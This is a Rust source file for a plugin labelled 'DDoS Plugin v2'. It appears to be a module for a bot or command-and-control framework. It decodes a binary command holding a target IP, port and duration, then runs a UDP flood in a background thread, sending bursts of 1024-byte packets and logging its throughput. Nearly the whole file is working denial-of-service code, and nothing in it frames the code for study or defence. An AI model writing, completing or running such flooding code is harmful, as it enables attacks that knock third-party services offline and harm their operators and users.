use plugin_api::HostContext;
use log::{info, warn};
use std::net::{UdpSocket, SocketAddr, Ipv4Addr};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

/// DDoS Plugin Implementation
pub struct DdosPlugin {
    target_count: usize,
}

impl DdosPlugin {
    pub fn new() -> Self {
        Self { target_count: 0 }
    }

    pub fn opcode(&self) -> u8 {
        0x01
    }

    pub fn execute(&self, cmd: &[u8], _ctx: &HostContext) -> Result<(), String> {
        if cmd.len() < 10 {
            return Err("Payload too short".to_string());
        }

        // Layout: [IP(4)] [Port(2)] [Duration(4)]
        let ip_bytes: [u8; 4] = cmd[0..4].try_into().unwrap();
        let port_bytes: [u8; 2] = cmd[4..6].try_into().unwrap();
        let dur_bytes: [u8; 4] = cmd[6..10].try_into().unwrap();

        let target_ip = u32::from_be_bytes(ip_bytes);
        let target_port = u16::from_be_bytes(port_bytes);
        let duration = u32::from_be_bytes(dur_bytes);

        info!("plugin(ddos): START target={}.{}.{}.{}:{} duration={}s", 
            (target_ip >> 24) & 0xFF, (target_ip >> 16) & 0xFF, (target_ip >> 8) & 0xFF, target_ip & 0xFF,
            target_port, duration
        );
        
        // Launch attack in background thread
        let stop_flag = Arc::new(AtomicBool::new(false));
        let stop_clone = stop_flag.clone();
        
        thread::spawn(move || {
            run_udp_flood(target_ip, target_port, duration, stop_clone);
        });
        
        Ok(())
    }
}

/// UDP Flood Attack
fn run_udp_flood(target_ip: u32, target_port: u16, duration_secs: u32, stop_flag: Arc<AtomicBool>) {
    // Convert IP to Ipv4Addr
    let ip = Ipv4Addr::new(
        ((target_ip >> 24) & 0xFF) as u8,
        ((target_ip >> 16) & 0xFF) as u8,
        ((target_ip >> 8) & 0xFF) as u8,
        (target_ip & 0xFF) as u8,
    );
    let target_addr = SocketAddr::new(ip.into(), target_port);
    
    // Bind to ephemeral port
    let socket = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(e) => {
            warn!("plugin(ddos): Failed to bind UDP socket: {}", e);
            return;
        }
    };
    
    // Set socket to non-blocking for better throughput
    let _ = socket.set_nonblocking(true);
    
    // Generate payload (random-ish data)
    let payload: Vec<u8> = (0..1024).map(|i| (i % 256) as u8).collect();
    
    let start_time = Instant::now();
    let duration = Duration::from_secs(duration_secs as u64);
    let mut packets_sent: u64 = 0;
    let mut bytes_sent: u64 = 0;
    
    info!("plugin(ddos): UDP flood started -> {}", target_addr);
    
    while !stop_flag.load(Ordering::Relaxed) {
        if start_time.elapsed() >= duration {
            break;
        }
        
        // Send burst of packets
        for _ in 0..100 {
            match socket.send_to(&payload, target_addr) {
                Ok(n) => {
                    packets_sent += 1;
                    bytes_sent += n as u64;
                }
                Err(_) => {
                    // Ignore errors (target unreachable, rate limiting, etc.)
                }
            }
        }
        
        // Small sleep to prevent CPU burnout
        thread::sleep(Duration::from_micros(100));
    }
    
    let elapsed = start_time.elapsed().as_secs_f64();
    let mbps = (bytes_sent as f64 * 8.0) / (elapsed * 1_000_000.0);
    
    info!("plugin(ddos): COMPLETE packets={} bytes={} duration={:.1}s rate={:.1}Mbps", 
        packets_sent, bytes_sent, elapsed, mbps
    );
}

// Use the macro to generate FFI exports
plugin_api::declare_plugin!(DdosPlugin, "DDoS Plugin v2");
